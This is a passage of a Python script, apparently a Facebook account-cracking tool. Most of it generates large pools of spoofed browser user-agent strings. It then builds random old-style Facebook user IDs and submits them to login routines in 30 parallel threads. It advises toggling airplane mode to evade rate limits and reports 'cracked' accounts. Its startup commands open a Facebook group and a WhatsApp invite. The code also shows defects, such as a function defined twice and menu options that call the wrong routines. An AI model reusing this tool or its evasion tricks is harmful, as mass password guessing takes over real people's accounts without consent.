  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['801SO'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 OPR/63.0.2254.62069'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for xd in range(10000):   
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='SM-G960N Build/QP1A.190711.020; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh)
for xd in range(10000): 
  aa='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['SM-J610F'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(80,106)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 12;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['2201116PG'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/107.0.0.0 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Infinix X688B'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/107.0.0.0 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Windows NT 10.0;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Win64; x64'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/107.0.0.0 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):    
   aa='Mozilla/5.0 (Series40;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Nokia2000/11.95;'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='S40OviBrowser/2.2.0.0.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 8.1.0;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['ASUS_Z01QD'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/72.0.3626.76 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):	
   aa='Mozilla/5.0 (Linux; Android 9;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['PortalTV'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/85.0.4183.120 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 9;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['PortalTV Build/PKQ1.190408.001; wv'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):	
   aa='Mozilla/5.0 (Linux; Android 5.1;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['GT-810 Build/LMY47I'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/66.0.3359.106 Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; U; Android 2.2;'
   b=random.choice(['6','7','8','9','10','11','12'])
   c='fr-fr; Desire_A8181 Build/'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l=' 4.0 Mobile Safari/533.1'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):	
   aa='Mozilla/5.0 (SMART-TV;'
   b=random.choice(['6','7','8','9','10','11','12'])
   c='Linux; Tizen 2.4.0)'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Safari/538.1'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; U; Android 2.3.6;'
   b=random.choice(['6','7','8','9','10','11','12'])
   c='fr-fr; GT-S5839i Build/'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g=' GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='4.0 Mobile Safari/534.30'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):	
   aa='Mozilla/5.0 (Linux; Android 4.0.4;'
   b=random.choice(['6','7','8','9','10','11','12'])
   c='LT30p Build/'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='7.0.A.3.195) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='18.0.1025.166 Mobile Safari/535.19'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['CPH1969 Build/RP1A.200720.011; wv)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36 WpsMoffice/16.6/arm64-v8a/1347'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000):
   aa='Mozilla/5.0 (Linux; Android 7.0;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Redmi Note 4 Build/NRD90M)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/63.0.3239.111 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Redmi Note 9 Pro'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['ASUS_I005DA)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/102.0.0.0 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 10;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Vivo Y91C)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/98.0.4711.185 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
   
for xd in range(10000):	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['M2012K11AG Build/'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 11;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['Oppo A38)'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Chrome/97.0.4740.200 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)
for xd in range(10000): 	
   aa='Mozilla/5.0 (Linux; Android 8.1.0;'
   b=random.choice(['7.0','8.1.0','9','10','11','12'])
   c=random.choice(['CPH1909 Build/O11019 )'])
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko)'
   h=random.randrange(80,103)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)

os.system('xdg-open https://facebook.com/groups/694691890038667/')
os.system('xdg-open https://chat.whatsapp.com/JUnN2CfzDv0HEe6SSQMFYf?mode=ac_c')

def linex():
    print(f'\r\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def line():
    print(f'\r\n\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

# Logo
logo = f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗

░█████╗░  ██╗░░██╗  ██████╗░
██╔══██╗  ██║░░██║  ██╔══██╗
███████║  ███████║  ██████╦╝
██╔══██║  ██╔══██║  ██╔══██╗
██║░░██║  ██║░░██║  ██████╦╝
╚═╝░░╚═╝  ╚═╝░░╚═╝  ╚═════╝░
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               
"""

def clear():
    os.system('clear')
    print(logo)



def linex():print(f'\r\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def line():print(f'\r\n\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

os.system('clear')

# ✅ Main Function (Runs after successful login)
os.system('espeak -a 300 "well,come to,ALi, tools"')
logo = f"""
\033[0;92m
       ░█████╗░  ██╗░░██╗  ██████╗░
       ██╔══██╗  ██║░░██║  ██╔══██╗
       ███████║  ███████║  ██████╦╝
       ██╔══██║  ██╔══██║  ██╔══██╗
       ██║░░██║  ██║░░██║  ██████╦╝
       ╚═╝░░╚═╝  ╚═╝░░╚═╝  ╚═════╝░
           
\033[0;92m               \033[0;92m

\33[0;41m       WORKING WIFI AND MOBILE DATA  \033[0;92m

\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mFACEBOOK   \33[38;5;160m▶  \033[1;97m ALi  
\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mWHATAPP    \33[38;5;160m▶  \033[1;97mNOT-AVAILABLE
\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mFEATURE    \33[38;5;160m▶  \033[1;97mOLD CLONE 
\33[38;5;160m[\033[1;97m✔️\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160m▶  \033[1;97m2.0
\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

def clear():
	os.system('clear');print(logo)

def main():
	clear()
	animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
	for i in range(30):
		time.sleep(0.1)
		sys.stdout.write(f"\r{r}[{w}ᯤ{r}]{s} LOADING...\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
		sys.stdout.flush()
	clear()
	print(f'\33[38;5;160m[\033[1;97m1\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2009\33[38;5;160m/\33[38;5;37m2010\33[38;5;160m]\033[1;97m')
	print(f'\33[38;5;160m[\033[1;97m2\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2011\33[38;5;160m/\33[38;5;37m2012\33[38;5;160m]\033[1;97m')
	print(f'\33[38;5;160m[\033[1;97m3\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2013\33[38;5;160m/\33[38;5;37m2014\33[38;5;160m]\033[1;97m')
	linex()
	ch = input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
	if ch in ('1','01','11','A','১','০১','a','A'):
		__Old1__()
	elif ch in ('3','33','03','c','B'):
		__Old2__()
	elif ch in ('4','04','44','C','d'):
		__Old3__()
 
def __Old1__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '100000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97m\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97m\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
        	uid=year_code+mal
        	jihad.submit(login1,uid)
        
def __Old1__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '10000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login2,uid)
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()

def __Old2__():
    user=[]
    clear()
